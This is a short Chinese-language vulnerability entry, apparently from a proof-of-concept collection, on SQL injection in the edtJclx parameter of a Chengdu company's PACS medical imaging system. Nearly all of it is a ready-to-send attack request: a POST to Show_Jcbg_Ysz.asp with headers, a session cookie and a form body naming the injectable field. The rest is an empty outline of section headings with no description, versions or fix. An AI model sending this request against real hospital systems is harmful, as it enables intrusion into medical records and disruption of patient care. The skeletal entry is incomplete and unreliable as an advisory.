# 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)edtJclx存在SQL注入漏洞

- **系统**：成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)edtJclx　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /JcbgForYsz/Show_Jcbg_Ysz.asp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 162`　`Cookie: ASPSESSIONIDCSBBQDTQ=KAJHGCOCOODELKOELMFGEMMK`

**请求体 / payload**
```
edtJclx=%A3%C2%D0%CD%B3%AC%C9%F9&edtQsrq=2023-10-17&edtJsrq=2023-10-17&edtBgzt=%D2%D1%D4%A4%D4%BC&edtZwxm=&edtSjks=%B1%BE%D4%BA%CC%E5%BC%EC&edtSubmit=%B2%E9%D1%AF
>
```

**其他**
- 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)edtJclx存在SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、特征
+ 四、漏洞复现
---
- 版本: + 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)